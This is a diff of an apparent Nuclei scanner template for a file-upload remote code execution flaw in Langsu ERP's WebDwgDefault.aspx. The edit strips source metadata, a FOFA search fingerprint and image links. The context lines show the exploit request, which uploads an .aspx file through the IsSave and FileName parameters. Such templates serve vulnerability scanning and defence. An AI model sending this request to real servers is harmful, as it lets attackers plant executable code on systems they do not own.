@@ -3,12 +3,8 @@ info:
   name: 朗速ERP WebDwgDefault.aspx存在文件上传致RCE漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/sb8kfdokak3t0gvw'
+  description: ''
   tags: rce,file-upload,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: sb8kfdokak3t0gvw
-    fofa: body="/Resource/Scripts/Yw/Yw_Bootstrap.js"
 http:
 - raw:
   - 'POST /WebDwgDefault.aspx?IsSave=true&FileName=1.aspx HTTP/1.1
@@ -67,11 +63,8 @@ http:
 
     ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
 
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1749286632241-e48bc43f-5167-416f-a7bb-c99512db1f07.png)
 
-    RCE
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1749286632480-34c1577d-cc22-4ba8-91b8-9a83fb36abd0.png)'
+    RCE'
   redirects: false
   matchers:
   - status:
